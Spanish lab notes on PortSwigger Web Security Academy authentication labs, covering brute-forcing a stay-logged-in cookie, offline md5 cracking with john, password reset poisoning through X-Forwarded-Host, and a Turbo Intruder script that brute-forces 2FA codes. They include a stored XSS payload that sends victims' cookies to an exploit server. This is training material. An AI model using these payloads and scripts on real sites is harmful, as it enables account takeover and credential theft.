# Detalles de mas labs

## Brute-forcing a stay-logged-in cookie

*Credenciales atacante:* wiener:peter

*Nombre Victima:* carlos

**Probando petición con credenciales del atacante**

Se encuentra que la cookie de sesión activa esta usando BASE64 ENCODE
> `d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw`

A través de Base64 DECODE se obtiene que
> `wiener:51dc30ddc473d43a6011e9ebba6ca770`

Por lo tanto la estructura sigue el siguiente formato

`<USERNAME>:<HASH>`

Ideas:
- Probablemente el hash sea la contraseña del usuario 
- El hash usado es md5

mediante `john` se obtuvo la contraseña de la cuenta del atacante. Esto mediante el algoritmo de hash md5 por lo tanto se puede efectuar el ataque haciendo uso de un proceso inverso.

- Se usa una wordlist de las posibles contraseñas
- Se hashea la contraseña mediante md5
- Se agrega el nombre de usuario antes del hash y el ":"
- Se codifica toda la cadena en base64
- Se prueba la cookie de session activa.

## Offline password cracking

Se uso **XSS** en la sección de comentarios de los post, Esto con el objetivo de obtener las cookies de los usuarios que ingresan al post con código malicioso.

Payload usado en los comentarios:
> `<script>document.location='//your-exploit-server-id.web-security-academy.net/'+document.cookie</script>`

Ahora tocaría esperar y observar las peticiones realizadas al server de explotación, por ejemplo:
> `...GET /secret=108m4GdGVmuIUqc7JFT2TT0AKJ7P4gNG;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz...`

Por lo tanto la cookie de la sesión activa es
> `Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz`

El cual decodificado se obtiene:
> `carlos:26323c16d5f4dabff3bb136f2460a943 `

Mediante fuerza bruta offline se obtiene la contraseña
> `sudo john -w=/usr/share/wordlists/rockyou.txt hash.txt --format=raw-md5`


## Password reset poisoning via middleware

Se observa que se puede agregar el encabezado de`X-Forwarded-Host` a la petición de *olvidar contraseña*
> `X-Forwarded-Host: <EXPLOIT_SERVER>`

Se edita la petición para el usuario de `carlos` y se agrega el anterior encabezado.

Mediante un server de explotación que actué como middleware se puede obtener el token para restablecer la contraseña
> `KIQ4eS0Ys7EZ7dbXze4xNWewkOx2DvZB`

Por lo tanto se puede ir al siguiente url con el token obtenido
> `https://0a2800e503574804c01c507e0014003a.web-security-academy.net/forgot-password?temp-forgot-password-token=KIQ4eS0Ys7EZ7dbXze4xNWewkOx2DvZB`

# 2FA bypass using a brute force attack

Código usado en Turbo Intruder
```
#Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           pipeline=False,
                           engine=Engine.BURP
                           )

    for num in range(0, 10000):
        nfa_code = '{0:04}'.format(num)
        engine.queue(target.req, nfa_code)

def handleResponse(req, interesting):
    if req.status == 302:
        table.add(req)
```